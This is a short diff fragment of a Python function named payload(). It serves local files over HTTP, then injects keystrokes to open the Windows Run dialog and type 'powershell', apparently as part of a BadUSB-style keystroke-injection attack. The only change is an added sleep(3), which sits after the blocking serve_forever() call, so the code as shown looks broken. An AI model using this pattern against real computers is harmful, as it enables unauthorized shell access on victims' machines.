@@ -38,6 +38,7 @@ def payload():
 	httpHandler = http.server.SimpleHTTPRequestHandler
 	httpd = socketserver.TCPServer(('',8000),httpHandler)
 	httpd.serve_forever()
+	sleep(3)
 	eco.press("LGUI+R")
 	sleep(1)
 	eco.type("powershell")
